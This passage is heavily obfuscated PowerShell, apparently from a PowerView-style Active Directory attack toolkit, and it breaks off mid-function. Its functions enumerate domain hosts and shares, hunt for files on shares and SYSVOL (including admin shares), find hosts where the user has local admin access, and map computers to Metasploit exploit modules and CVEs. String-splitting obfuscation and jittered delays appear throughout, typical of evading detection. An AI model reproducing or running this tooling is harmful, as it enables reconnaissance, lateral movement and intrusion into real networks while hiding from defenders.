            &("{2}{0}{1}{3}"-f 'b','o','Write-Ver','se') "[*] Total number of active hosts: $($ComputerName.count) "
            ${c`O`UNter} = 0

            ForEach (${C`omPut`ER} in ${CO`MpUTE`R`Name}) {

                ${co`Un`TEr} = ${COuNt`ER} + 1

                
                &("{2}{1}{0}" -f'-Sleep','tart','S') -Seconds ${r`ANDnO}.("{0}{1}" -f'Nex','t').Invoke((1-${jIT`T`eR})*${D`ElAY}, (1+${J`i`TTeR})*${De`lAy})

                &("{0}{2}{1}{3}"-f 'Wri','V','te-','erbose') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count)) "
                &("{3}{1}{0}{2}"-f 'ma','oke-Com','nd','Inv') -ScriptBlock ${H`oSt`ENUMbloCk} -ArgumentList ${COm`pu`Ter}, ${fA`lSE}, ${C`Heck`SHaR`EacC`EsS}, ${ex`C`L`UdedSH`ARes}, ${C`hE`cKAdMin}
            }
        }
        
    }
}


function InvO`KE-FIlEFi`N`DEr {


    [CmdletBinding()]
    param(
        [Parameter(pOSItIon=0,VALuEFRompipELiNe=${t`RuE})]
        [Alias({"{0}{1}"-f'Hos','ts'})]
        [String[]]
        ${com`Pu`TERnAme},

        [ValidateScript({&("{2}{1}{0}"-f'h','-Pat','Test') -Path ${_} })]
        [Alias({"{0}{1}{2}"-f 'H','os','tList'})]
        [String]
        ${Co`MP`UtER`File},

        [String]
        ${CoMPUT`eR`FILTer},

        [String]
        ${c`Omp`UtE`RaD`spaTh},

        [ValidateScript({&("{1}{2}{0}{3}"-f 'P','Te','st-','ath') -Path ${_} })]
        [String]
        ${s`HAR`elIst},

        [Switch]
        ${o`FfICeDo`Cs},

        [Switch]
        ${F`RE`S`HeXES},

        [String[]]
        ${TE`R`Ms},

        [ValidateScript({&("{2}{1}{0}" -f 'ath','-P','Test') -Path ${_} })]
        [String]
        ${teR`m`l`ist},

        [String]
        ${Las`TAcCESsT`iME},

        [String]
        ${lAS`TWriTe`TImE},

        [String]
        ${cReATIoN`TI`me},

        [Switch]
        ${i`NCL`UdEc},

        [Switch]
        ${InC`LU`deadMIN},

        [Switch]
        ${Ex`cl`UDEF`olDeRs},

        [Switch]
        ${EXcL`Ude`Hi`DD`EN},

        [Switch]
        ${C`HEc`kwRI`T`eaCceSs},

        [String]
        ${o`UtFiLE},

        [Switch]
        ${N`Oclo`B`BeR},

        [Switch]
        ${n`oP`iNg},

        [UInt32]
        ${deL`Ay} = 0,

        [Double]
        ${Ji`TT`Er} = .3,

        [String]
        ${do`M`AIN},

        [String]
        ${dOMAI`N`C`On`Tr`oLlER},
        
        [Switch]
        ${sear`Ch`FOrest},

        [Switch]
        ${sE`ArCHs`ysVol},

        [ValidateRange(1,100)] 
        [Int]
        ${tHr`eA`Ds},

        [Switch]
        ${u`s`epSD`RIve},

        [System.Management.Automation.PSCredential]
        ${CR`EdE`Nti`AL} =   ${T`65Pi}::"e`mPTY"
    )

    begin {
        if (${P`S`Bo`UnDPARaMeTERS}[("{0}{1}"-f'De','bug')]) {
            ${DeBU`G`prEFeren`Ce} = ("{2}{1}{0}"-f'ue','n','Conti')
        }

        
        ${rAND`NO} = &("{0}{2}{1}"-f'New-','bject','O') ("{2}{1}{3}{0}" -f 'm.Random','s','Sy','te')

        &("{3}{1}{2}{0}" -f 'se','it','e-Verbo','Wr') ('[*]'+' '+'R'+'unning'+' '+'Invoke-F'+'ile'+'F'+'inder '+'wi'+'th '+'d'+'elay'+' '+'o'+'f '+"$Delay")

        ${Sh`AReS} = @()

        
        [String[]] ${ex`CLU`dE`DshAr`ES} = @("C$", "ADMIN$")

        
        if (${In`C`LUdec}) {
            if (${in`CLuD`EaDmiN}) {
                ${exCl`UdE`DSHA`ReS} = @()
            }
            else {
                ${exclUDe`dSha`R`eS} = @("ADMIN$")
            }
        }

        if (${iNclu`d`eaDMIn}) {
            if (${inc`L`Udec}) {
                ${exCl`U`D`edSH`ArEs} = @()
            }
            else {
                ${e`Xc`lu`D`edShares} = @("C$")
            }
        }

        
        if(!${n`Oc`LoBB`Er}) {
            if (${o`UtfI`lE} -and (&("{0}{2}{1}" -f'Test','h','-Pat') -Path ${oUT`Fi`lE})) { &("{2}{1}{0}"-f 'em','It','Remove-') -Path ${Out`Fi`le} }
        }

        
        if (${Te`RMLi`St}) {
            ForEach (${tE`Rm} in &("{1}{0}{2}{3}"-f'o','Get-C','nte','nt') -Path ${TE`RMli`st}) {
                if ((${T`ErM} -ne ${N`Ull}) -and (${Te`Rm}.("{0}{1}" -f't','rim').Invoke() -ne '')) {
                    ${ter`mS} += ${tE`Rm}
                }
            }
        }

        
        if(${SH`Ar`eLiSt}) {
            ForEach (${i`TEM} in &("{2}{0}{1}" -f 'onte','nt','Get-C') -Path ${shAR`El`iSt}) {
                if ((${iT`Em} -ne ${n`Ull}) -and (${It`EM}.("{1}{0}" -f 'm','tri').Invoke() -ne '')) {
                    
                    ${SH`ArE} = ${It`em}.("{0}{1}" -f'Sp','lit').Invoke("`t")[0]
                    ${S`h`AREs} += ${shA`Re}
                }
            }
        }
        else {
            
            if(${co`mPu`TErFi`Le}) {
                ${coMpu`Ter`Na`me} = &("{0}{1}{2}" -f'Get','-Cont','ent') -Path ${CO`Mpu`T`E`RFIlE}
            }

            if(!${c`o`mP`U`TeRnaME}) {

                if(${D`OMaIn}) {
                    ${t`Ar`g`etDomAINS} = @(${D`oMAIN})
                }
                elseif(${S`EARChFoR`E`sT}) {
                    
                    ${tAR`Ge`TDo`Ma`inS} = &("{2}{1}{4}{3}{5}{0}" -f'stDomain','N','Get-','Fo','et','re') | &("{1}{0}{3}{2}"-f 'Eac','For','t','h-Objec') { ${_}."n`Ame" }
                }
                else {
                    
                    ${TA`Rg`etDOMainS} = @( (&("{2}{1}{4}{3}{0}"-f 'n','et','Get-N','mai','Do'))."Na`mE" )
                }

                if(${SEA`RcHsy`SVol}) {
                    ForEach (${D`oMaIn} in ${ta`RGe`TdOMai`NS}) {
                        ${dc`SE`ArChpa`TH} = "\\$Domain\SYSVOL\"
                        &("{0}{2}{1}{3}" -f 'Write-V','b','er','ose') ('[*'+'] '+'A'+'dding '+'shar'+'e '+'search'+' '+'path'+' '+"$DCSearchPath")
                        ${ShaR`Es} += ${D`CsEARc`h`PAth}
                    }
                    if(!${T`eR`mS}) {
                        
                        ${t`E`Rms} = @(("{1}{0}"-f 's','.vb'), ("{1}{0}" -f't','.ba'), ("{0}{1}"-f'.ps','1'))
                    }
                }
                else {
                    [array]${c`OMPutE`R`NaME} = @()

                    ForEach (${d`Om`Ain} in ${TA`R`gE`TDOMaINs}) {
                        &("{0}{2}{3}{1}"-f 'Wr','rbose','ite','-Ve') ('['+'*] '+'Query'+'ing'+' '+'do'+'main'+' '+"$Domain "+'for'+' '+'host'+'s')
                        ${coMP`UteRN`AME} += &("{1}{0}{2}{3}{4}"-f'Net','Get-','Co','mpu','ter') -Filter ${CompU`T`ErFi`lTEr} -ADSpath ${cOmpU`TEraD`s`PaTH} -Domain ${dO`M`AIN} -DomainController ${D`oMAi`N`C`oNtroLLEr}
                    }

                    
                    ${CoM`P`U`T`erName} = ${C`OmP`UTE`RnaME} | &("{1}{2}{0}{3}"-f '-O','W','here','bject') { ${_} } | &("{2}{1}{0}" -f'ject','t-Ob','Sor') -Unique | &("{3}{0}{1}{2}"-f'rt-','O','bject','So') { &("{0}{2}{1}"-f 'Ge','ndom','t-Ra') }
                    if($(${C`Ompu`T`E`RNAmE}."CoU`NT") -eq 0) {
                        throw ("{1}{0}{4}{3}{2}" -f ' ','No','ound!','f','hosts ')
                    }
                }
            }
        }

        
        ${hoSTEN`UM`BLOck} = {
            param(${cOMp`U`T`e`RnaMe}, ${pI`Ng}, ${E`xClU`dEDSha`Res}, ${T`E`RMs}, ${e`xclude`FO`lDers}, ${O`F`FI`CedocS}, ${EXC`ludEHI`dDEN}, ${fR`EShE`xEs}, ${CHeCkW`RIT`ea`Cc`ess}, ${ou`TfIle}, ${usEp`s`DR`IvE}, ${c`R`eDe`NTiaL})

            &("{0}{1}{2}{3}" -f 'Write-Verb','o','s','e') ('Com'+'pu'+'terName: '+"$ComputerName")
            &("{2}{1}{3}{0}" -f 'ose','te-','Wri','Verb') ('E'+'xclude'+'dSha'+'r'+'es: '+"$ExcludedShares")
            ${s`EarcHsHA`REs} = @()

            if(${c`O`mpuTErn`Ame}.("{0}{2}{1}" -f'StartsW','h','it').Invoke("\\")) {
                
                ${SE`Arch`s`hARes} += ${co`mP`UTerNamE}
            }
            else {
                
                ${u`P} = ${t`RUE}
                if(${Pi`NG}) {
                    ${U`p} = &("{1}{0}{4}{2}{3}"-f't-C','Tes','ti','on','onnec') -Count 1 -Quiet -ComputerName ${c`Om`PU`Te`RNaMe}
                }
                if(${Up}) {
                    
                    ${shar`ES} = &("{2}{1}{0}{3}"-f 'NetSha','et-','G','re') -ComputerName ${COMpU`TeR`Na`me}
                    ForEach (${SH`Are} in ${S`h`AREs}) {

                        ${n`Et`NAmE} = ${s`h`ArE}."shi1`_nEt`Na`mE"
                        ${P`Ath} = '\\'+${C`oM`pU`T`eRNAmE}+'\'+${N`e`TnAMe}

                        
                        if ((${nET`NaMe}) -and (${NE`TNa`ME}.("{1}{0}" -f'im','tr').Invoke() -ne '')) {

                            
                            if (${eX`CLu`ded`shaReS} -NotContains ${NetN`A`mE}.("{1}{2}{0}"-f'r','ToUpp','e').Invoke()) {
                                
                                try {
                                    ${nU`ll} =  (  &("{2}{1}{0}"-f'ble','ria','Va') ('cr'+'gP0') ).vALUe::("{2}{1}{0}"-f'iles','tF','Ge').Invoke(${Pa`TH})
                                    ${sE`ArcHsh`Ares} += ${P`ATh}
                                }
                                catch {
                                    &("{0}{1}{2}"-f 'Writ','e-Deb','ug') ('[!'+'] '+'No'+' '+'a'+'ccess '+'t'+'o '+"$Path")
                                }
                            }
                        }
                    }
                }
            }

            ForEach(${SHA`Re} in ${SearcHS`HAR`es}) {
                ${S`EaRcH`ARgS} =  @{
                    ("{0}{1}"-f 'P','ath') = ${S`h`ARe}
                    ("{1}{0}" -f 'rms','Te') = ${te`RMS}
                    ("{0}{2}{3}{1}"-f 'Off','cs','i','ceDo') = ${oF`F`Ic`EdoCS}
                    ("{2}{1}{0}" -f 's','reshEXE','F') = ${fRes`H`EXES}
                    ("{0}{2}{3}{1}{4}" -f'La','ce','st','Ac','ssTime') = ${LaStA`C`Ces`sTi`Me}
                    ("{1}{0}{3}{2}" -f 'astWr','L','Time','ite') = ${l`ASTWri`T`ET`Ime}
                    ("{1}{0}{2}"-f'reati','C','onTime') = ${cRe`A`TI`ontime}
                    ("{4}{2}{0}{3}{1}" -f 'Fol','s','ude','der','Excl') = ${ExCL`UDE`FOLd`ERS}
                    ("{2}{0}{3}{1}"-f 'clu','Hidden','Ex','de') = ${E`xC`lU`DEHiDdeN}
                    ("{0}{1}{2}{3}"-f 'CheckWri','teA','cces','s') = ${c`HE`Ckw`Rit`eACcE`Ss}
                    ("{0}{2}{1}" -f'O','e','utFil') = ${o`UtFiLe}
                    ("{1}{2}{0}" -f'rive','Use','PSD') = ${Use`pS`DrivE}
                    ("{1}{0}{2}" -f 'edenti','Cr','al') = ${Cr`Eden`TIAL}
                }

                &("{0}{4}{6}{5}{1}{3}{2}"-f 'F','eres','ile','tingF','in','Int','d-') @SearchArgs
            }
        }
    }

    process {

        if(${thR`e`ADs}) {
            &("{0}{2}{1}{3}{4}" -f'W','e','rit','-Ve','rbose') ('Using'+' '+'thr'+'eadin'+'g'+' '+'wi'+'th '+'th'+'reads '+'= '+"$Threads")

            
            ${sc`R`iPTPaRams} = @{
                ("{1}{0}"-f 'ng','Pi') = $(-not ${NOpi`Ng})
                ("{1}{3}{2}{0}" -f'res','Exc','edSha','lud') = ${e`X`C`LudEdS`HARes}
                ("{1}{0}" -f 'erms','T') = ${t`Er`Ms}
                ("{0}{2}{3}{1}"-f 'Ex','ers','clud','eFold') = ${exclU`deFOl`d`e`RS}
                ("{1}{2}{0}" -f 's','Off','iceDoc') = ${O`Ffic`ed`oCS}
                ("{3}{1}{2}{0}{4}" -f 'e','udeHid','d','Excl','n') = ${ExC`L`Ud`eh`idDEN}
                ("{0}{2}{1}" -f'FreshE','s','XE') = ${FRe`ShE`xES}
                ("{0}{1}{2}{3}" -f 'Chec','kWri','te','Access') = ${chE`cKWrITe`A`Cce`sS}
                ("{0}{1}{2}"-f'O','utFi','le') = ${oU`TFiLE}
                ("{2}{0}{1}"-f'PSD','rive','Use') = ${US`e`PsdRiVe}
                ("{2}{1}{0}" -f'ial','edent','Cr') = ${c`Re`den`Tial}
            }

            
            if(${sha`R`Es}) {
                
                &("{0}{4}{3}{1}{2}" -f'Invoke-Thr','n','ction','dedFu','ea') -ComputerName ${ShAR`es} -ScriptBlock ${h`oST`ENU`mbLOcK} -ScriptParameters ${ScRIpT`PA`R`Ams}
            }
            else {
                &("{4}{1}{0}{5}{2}{3}" -f '-','oke','Funct','ion','Inv','Threaded') -ComputerName ${COmP`Ut`er`NA`me} -ScriptBlock ${Ho`sT`eNuM`BlOcK} -ScriptParameters ${sc`RiPt`par`AmS}
            }        
        }

        else {
            if(${sHar`eS}){
                ${co`mP`UTER`N`AMe} = ${S`HARES}
            }
            elseif(-not ${nop`INg} -and (${CoM`PuT`eRnAMe}."CO`UnT" -gt 1)) {
                
                ${pi`Ng} = {param(${Co`mpU`TeRNAme}) if(&("{4}{2}{0}{3}{1}"-f'-Conn','tion','est','ec','T') -ComputerName ${c`omPuTern`A`ME} -Count 1 -Quiet -ErrorAction ("{0}{1}"-f 'Sto','p')){${c`oMpUtER`NAmE}}}
                ${cOmPu`T`eRNA`mE} = &("{4}{5}{3}{2}{1}{0}" -f'on','ti','dFunc','voke-Threade','I','n') -NoImports -ComputerName ${c`OMpu`TeR`N`AMe} -ScriptBlock ${p`iNg} -Threads 100
            }

            &("{0}{2}{1}{3}" -f 'Write-Ve','bos','r','e') "[*] Total number of active hosts: $($ComputerName.count) "
            ${C`oU`NTEr} = 0

            ${CO`m`pu`TeRN`AmE} | &("{2}{3}{1}{0}" -f 'ct','-Obje','Whe','re') {${_}} | &("{1}{0}{4}{2}{3}" -f'rEach','Fo','bje','ct','-O') {
                &("{3}{1}{2}{0}"-f'se','te-Ve','rbo','Wri') ('C'+'o'+'mputer: '+"$_")
                ${C`oUn`TeR} = ${CO`U`Nter} + 1

                
                &("{3}{0}{2}{1}" -f'rt-S','eep','l','Sta') -Seconds ${R`A`Ndno}.("{0}{1}"-f'Ne','xt').Invoke((1-${jIT`TeR})*${de`lAY}, (1+${jitt`ER})*${d`E`lAY})

                &("{1}{2}{0}{3}" -f'ite','W','r','-Verbose') "[*] Enumerating server $_ ($Counter of $($ComputerName.count)) "

                &("{3}{0}{2}{1}" -f'ke-C','and','omm','Invo') -ScriptBlock ${HO`S`T`ENumbL`OcK} -ArgumentList ${_}, ${FA`Lse}, ${eX`cLU`dedShAR`ES}, ${Te`RmS}, ${ExClUd`e`FoLd`ers}, ${O`F`FIced`OCS}, ${Exclu`dE`HI`ddEn}, ${freS`He`X`es}, ${c`hec`K`W`RitEAccEss}, ${Out`FiLe}, ${uSe`PSDR`IvE}, ${crEDE`NTi`Al}                
            }
        }
    }
}


function F`ind-lo`cAlAdmin`A`cc`E`Ss {


    [CmdletBinding()]
    param(
        [Parameter(POSiTiON=0,ValUEFroMPIpElinE=${T`RUe})]
        [Alias({"{0}{1}"-f'Host','s'})]
        [String[]]
        ${cO`mpU`TE`RnaME},

        [ValidateScript({&("{2}{1}{0}" -f'h','at','Test-P') -Path ${_} })]
        [Alias({"{1}{2}{0}"-f 'tList','H','os'})]
        [String]
        ${c`omPUte`Rfi`le},

        [String]
        ${COmPu`TeRfI`LT`eR},

        [String]
        ${cO`m`P`UTeRADSP`ATh},

        [Switch]
        ${noPi`Ng},

        [UInt32]
        ${DeL`Ay} = 0,

        [Double]
        ${J`i`TtER} = .3,

        [String]
        ${DO`MAiN},

        [String]
        ${do`Ma`IN`cOntRo`l`leR},

        [Switch]
        ${SeA`R`cHFOrESt},

        [ValidateRange(1,100)] 
        [Int]
        ${tH`ReaDs}
    )

    begin {
        if (${pS`B`OU`N`DpaRaMETE`Rs}[("{1}{0}" -f 'ebug','D')]) {
            ${DEbUgp`ReF`er`en`ce} = ("{1}{2}{0}"-f 'tinue','C','on')
        }

        
        ${ran`d`No} = &("{2}{1}{0}" -f 'ect','ew-Obj','N') ("{2}{3}{4}{1}{0}" -f 'm','ando','Sy','ste','m.R')

        &("{4}{0}{2}{1}{3}"-f 'Ve','b','r','ose','Write-') ('[*'+'] '+'Runn'+'i'+'ng '+'Fi'+'n'+'d-LocalAdmi'+'nAc'+'c'+'ess '+'w'+'ith '+'d'+'e'+'lay '+'of'+' '+"$Delay")

        
        if(${CO`m`p`UterfIle}) {
            ${COmpUT`e`R`NAME} = &("{0}{1}{3}{2}" -f 'G','et','ntent','-Co') -Path ${Co`mP`UtER`F`Ile}
        }

        if(!${CompU`TE`RnamE}) {
            [array]${CoMPUTeR`N`AMe} = @()

            if(${D`O`MAin}) {
                ${T`ArgEtd`o`MAInS} = @(${doM`AiN})
            }
            elseif(${seAr`c`HfOREST}) {
                
                ${TA`R`g`Etdom`AINs} = &("{2}{4}{0}{1}{5}{3}" -f 'tFore','stD','Get-','n','Ne','omai') | &("{2}{0}{4}{3}{1}"-f 'E','t','For','jec','ach-Ob') { ${_}."Na`Me" }
            }
            else {
                
                ${Tar`ge`TdoMA`iNS} = @( (&("{2}{0}{1}" -f 'Doma','in','Get-Net'))."N`AME" )
            }

            ForEach (${Do`mA`In} in ${Ta`R`get`Do`mAIns}) {
                &("{1}{0}{3}{2}" -f 'rite','W','Verbose','-') ('['+'*] '+'Q'+'uerying'+' '+'doma'+'i'+'n '+"$Domain "+'for'+' '+'h'+'osts')
                ${C`OMpUT`erName} += &("{3}{1}{0}{2}" -f'etCompu','et-N','ter','G') -Filter ${Com`PuT`ERFI`lT`eR} -ADSpath ${Co`m`PUTer`AdsPAtH} -Domain ${Do`m`Ain} -DomainController ${DO`MaiN`cOntRoL`ler}
            }
        
            
            ${Comp`UTe`RN`AME} = ${Co`mpuT`E`RnA`me} | &("{0}{2}{1}" -f'Whe','ct','re-Obje') { ${_} } | &("{0}{2}{1}{3}"-f 'So','e','rt-Obj','ct') -Unique | &("{1}{2}{0}" -f 'ect','Sort-Ob','j') { &("{3}{2}{0}{1}"-f 'o','m','-Rand','Get') }
            if($(${cOmpu`T`ERNa`ME}."co`UNT") -eq 0) {
                throw ("{1}{3}{2}{0}" -f 'ound!','N','f','o hosts ')
            }
        }

        
        ${h`OSTEn`U`MbLOck} = {
            param(${C`Om`putEr`Na`mE}, ${pi`Ng})

            ${u`p} = ${T`Rue}
            if(${p`ing}) {
                ${uP} = &("{2}{1}{0}{4}{3}"-f 'Con','-','Test','ction','ne') -Count 1 -Quiet -ComputerName ${co`mpUtErn`A`me}
            }
            if(${Up}) {
                
                ${Acc`ESs} = &("{5}{1}{0}{7}{2}{4}{6}{3}"-f'e-Chec','nvok','Loca','ss','lAdmin','I','Acce','k') -ComputerName ${CO`mP`U`TERnAmE}
                if (${A`cCE`sS}) {
                    ${comP`UTER`NAmE}
                }
            }
        }

    }

    process {

        if(${Threa`Ds}) {
            &("{2}{1}{3}{0}" -f'Verbose','e','Writ','-') ('Us'+'in'+'g '+'t'+'hread'+'ing '+'with'+' '+'thre'+'ads'+' '+'= '+"$Threads")

            
            ${scri`pt`PARA`ms} = @{
                ("{1}{0}" -f'ng','Pi') = $(-not ${NoP`Ing})
            }

            
            &("{3}{1}{2}{0}{4}{5}" -f 'edF','ok','e-Thread','Inv','uncti','on') -ComputerName ${comp`U`TeRna`me} -ScriptBlock ${Ho`St`ENuMblO`CK} -ScriptParameters ${S`CrIPTp`Ara`MS}
        }

        else {
            if(-not ${N`O`pIng} -and (${cOMP`Ute`RN`AME}."cou`Nt" -ne 1)) {
                
                ${PI`NG} = {param(${CoM`puTer`NAME}) if(&("{2}{0}{1}{3}" -f 'n','ecti','Test-Con','on') -ComputerName ${c`OM`PU`TEr`NAME} -Count 1 -Quiet -ErrorAction ("{0}{1}" -f'St','op')){${C`O`m`p`UTERName}}}
                ${CompU`Ter`NaME} = &("{3}{1}{0}{4}{2}" -f'e-T','k','ction','Invo','hreadedFun') -NoImports -ComputerName ${c`Ompu`T`ERNamE} -ScriptBlock ${p`inG} -Threads 100
            }

            &("{1}{2}{0}" -f'e-Verbose','W','rit') "[*] Total number of active hosts: $($ComputerName.count) "
            ${C`OuN`TEr} = 0

            ForEach (${com`Put`eR} in ${CoMp`UTE`R`NAmE}) {

                ${C`O`UNTeR} = ${c`Ou`NTeR} + 1

                
                &("{0}{3}{2}{1}"-f 'Sta','p','-Slee','rt') -Seconds ${raND`No}.("{0}{1}" -f'Ne','xt').Invoke((1-${J`ItT`ER})*${DeL`Ay}, (1+${Ji`T`TER})*${dEL`Ay})

                &("{0}{3}{4}{1}{2}" -f 'Wri','er','bose','te','-V') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count)) "
                &("{1}{2}{3}{0}"-f'Command','Inv','o','ke-') -ScriptBlock ${hOst`eN`UmB`l`ocK} -ArgumentList ${C`oMPU`T`er}, ${fA`L`sE}, ${o`UtfiLe}, ${Do`mai`NSid}, ${t`RusTgRoU`PSs`IDS}
            }
        }
    }
}


function GeT`-`eXPlOI`T`ABlE`s`YstEM {

    [CmdletBinding()]
    Param(
        [Parameter(vaLueFroMpiPElInE=${Tr`Ue})]
        [Alias({"{0}{2}{1}"-f'Ho','e','stNam'})]
        [String]
        ${Co`mp`UtERNAme} = '*',

        [String]
        ${s`PN},

        [String]
        ${OpERA`Ti`NG`SyST`Em} = '*',

        [String]
        ${sErvIC`eP`Ack} = '*',

        [String]
        ${f`Il`TER},

        [Switch]
        ${pI`NG},

        [String]
        ${doMa`iN},

        [String]
        ${dO`maINCo`NTr`oLLEr},

        [String]
        ${Ad`SpA`Th},

        [Switch]
        ${U`NCOnSTRa`InEd},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`GEs`IZe} = 200
    )

    &("{3}{2}{1}{0}" -f 'se','rbo','-Ve','Write') ("{8}{11}{2}{12}{1}{0}{9}{7}{5}{13}{10}{4}{3}{6}" -f 'te','ompu','a','or','Direct','om Act','y...',' accounts fr','[*]','r',' ',' Gr','bbing c','ive')

    
    ${TA`BleADscO`mPut`ERS} = &("{0}{2}{1}" -f'New-','ect','Obj') ("{0}{2}{1}{4}{3}" -f'Sys','.D','tem','Table','ata.Data') 
    ${nU`LL} = ${TA`BL`EadSCOmpUt`eRS}."Co`lUM`Ns".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{2}" -f 'Ho','st','name'))       
    ${NU`ll} = ${tABLe`A`D`scompUT`E`Rs}."col`UMNS".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}"-f 'O','System','perating'))
    ${nu`Ll} = ${Ta`BLe`A`Ds`C`OMputers}."co`lum`NS".("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}" -f'Se','vicePack','r'))
    ${nU`Ll} = ${t`ABLEaDS`CO`mpUTERS}."Colu`m`Ns".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{0}" -f 'tLogon','L','as'))

    &("{1}{0}{4}{2}{3}" -f'NetCo','Get-','e','r','mput') -FullData @PSBoundParameters | &("{2}{3}{1}{0}" -f't','ch-Objec','For','Ea') {

        ${CurRent`h`O`st} = ${_}."dN`SHoSTN`AMe"
        ${CU`R`REnT`Os} = ${_}."opE`R`A`Ti`NGSYStEm"
        ${cur`RE`NtSp} = ${_}."oP`erATiN`g`S`YsTEMserv`IC`e`paCk"
        ${C`U`RR`EnTlASt} = ${_}."lAs`TlO`GON"
        ${cur`Rentu`AC} = ${_}."u`s`ERAcCo`UntcO`N`TrOL"

        ${c`UrreNTUA`cBIN} =  (  &('ls') VaRIabLE:lcSg ).vaLuE::("{2}{0}{1}" -f 'r','ing','ToSt').Invoke(${_}."uS`e`RaccOUNTcONTR`OL",2)

        
        ${DI`s`AbLeoFF`sEt} = ${cuR`RE`NTuacb`in}."LENg`TH" - 2
        ${cUrreNt`dIsA`BLed} = ${C`Ur`Re`NTu`Acbin}.("{0}{2}{1}" -f 'Su','ring','bst').Invoke(${dis`A`BLEOfFSet},1)

        
        if (${CU`RrEnT`disab`LEd}  -eq 0) {
            
            ${n`ULl} = ${t`ABleaDs`ComPuT`eRs}."ro`ws".("{1}{0}"-f'd','Ad').Invoke(${c`URR`EnTHOst},${cur`Ren`Tos},${CU`R`ReNTSP},${C`URr`entl`AsT})
        }
    }

    
    &("{3}{1}{2}{4}{0}" -f 'e','rite','-Ve','W','rbos') ("{9}{3}{8}{10}{15}{2}{11}{16}{7}{0}{4}{6}{12}{1}{13}{14}{5}" -f 'a','g','o','] ','l','s...',' mi','tic','Loading','[*',' exploit list','r cr','ssin',' pat','che',' f','i')

    
    
    

    
    ${TAb`LeEx`ploIts} = &("{0}{1}{3}{2}" -f'N','ew','ct','-Obje') ("{2}{4}{1}{3}{0}" -f'able','Data.D','Sys','ataT','tem.') 
    ${n`ULl} = ${tA`B`L`EeXPLoitS}."CO`LumNs".("{0}{1}" -f 'Ad','d').Invoke(("{1}{4}{3}{0}{2}"-f 'ste','Op','m','atingSy','er')) 
    ${N`ULL} = ${T`AbLee`XPLoITs}."Colum`Ns".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}" -f 'S','Pack','ervice'))
    ${N`ULl} = ${TaBLe`EXp`lo`its}."cOL`UMNs".("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}" -f'Msf','Modul','e'))  
    ${n`ULL} = ${tab`lEeX`PLOi`TS}."COlU`M`Ns".("{1}{0}"-f'dd','A').Invoke('CVE')
    
    
    ${n`ULL} = ${tAb`LEEXpL`oiTS}."r`oWS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}" -f 'nd','Wi','ows 7'),"",("{5}{4}{3}{1}{0}{6}{2}" -f'61_s','ms10_0','s','ows/smb/','d','exploit/win','pools'),("{7}{0}{5}{3}{1}{4}{2}{6}"-f '/www.cv','s','10-27','tail','.com/cve/20','ede','29','http:/'))  
    ${n`Ull} = ${TaBlEExp`L`o`i`Ts}."RO`wS".("{0}{1}"-f 'A','dd').Invoke(("{3}{2}{1}{0}"-f '0','200','er ','Windows Serv'),("{1}{0}{3}{2}" -f 'r Pa','Serve','k 1','c'),("{2}{4}{7}{9}{8}{6}{5}{0}{1}{3}" -f '_','dc','e','om','x','3_026','/dcerpc/ms0','p','/windows','loit'),("{5}{0}{6}{7}{3}{10}{9}{8}{2}{4}{1}" -f'ww','/','03-','edeta','0352','http://w','.','cv','m/cve/20','ls.co','i'))  
    ${nu`Ll} = ${TAb`LEex`P`LOI`Ts}."r`oWs".("{0}{1}" -f'A','dd').Invoke(("{0}{2}{1}{3}" -f'Wi','dows Se','n','rver 2000'),("{3}{0}{2}{1}"-f 've','Pack 1','r ','Ser'),("{5}{3}{0}{4}{1}{2}"-f 'it/win','rp','c/ms05_017_msmq','plo','dows/dce','ex'),("{7}{3}{6}{4}{1}{5}{0}{2}"-f '-0','edetails.com/cve/200','059','p','/www.cv','5',':/','htt'))  
    ${n`UlL} = ${T`ABL`eExPlOi`TS}."ro`ws".("{0}{1}" -f'A','dd').Invoke(("{2}{3}{0}{1}"-f 'e','rver 2000','Wind','ows S'),("{1}{3}{2}{0}{4}"-f ' ','Se','ver','r','Pack 1'),("{8}{5}{3}{1}{2}{0}{6}{7}{9}{4}" -f 'ws/i','n','do','i','l_webdav','/w','is/m','s03_007_n','exploit','tdl'),("{9}{0}{6}{5}{4}{7}{11}{1}{2}{8}{10}{3}" -f 'tp:','0','03','09','www.cvedetails.c','/','/','om/cve/','-0','ht','1','2'))  
    ${nu`LL} = ${Ta`BlEE`XP`lOIts}."r`owS".("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{3}{2}"-f 'Windows ','Server ','0','200'),("{3}{0}{2}{1}" -f ' ','k 1','Pac','Server'),("{8}{7}{1}{6}{3}{4}{2}{5}{0}"-f 's','loi','_045_w','/windo','ws/wins/ms04','in','t','p','ex'),("{5}{9}{6}{7}{8}{3}{0}{1}{2}{4}"-f'/2','0','04-','ve','1080/','h','.cvedeta','ils.co','m/c','ttp://www'))  
    ${Nu`ll} = ${t`Ableex`plOiTS}."r`oWs".("{0}{1}"-f 'Ad','d').Invoke(("{6}{2}{4}{3}{0}{5}{1}"-f'0','0','ows S','r 2','erve','0','Wind'),("{1}{0}{2}"-f 'er','S','vice Pack 2'),("{7}{2}{0}{3}{9}{8}{6}{4}{1}{10}{5}" -f't','s03_026_','oi','/w','erpc/m','com','dc','expl','s/','indow','d'),("{0}{5}{3}{4}{2}{6}{1}" -f'http://ww','/cve/2003-0352/','s.','edet','ail','w.cv','com'))  
    ${N`ULl} = ${TA`B`leex`pLoItS}."R`Ows".("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{2}{4}"-f ' ','dows Server','2','Win','000'),("{2}{3}{0}{1}"-f 'c','k 2','Se','rvice Pa'),("{6}{4}{5}{0}{1}{2}{3}"-f '/ms05_017_','m','sm','q','ndows/','dcerpc','exploit/wi'),("{3}{8}{4}{10}{2}{0}{5}{9}{1}{6}{7}"-f 'com/','/2005-','.','ht','//www.','cv','005','9','tp:','e','cvedetails'))  
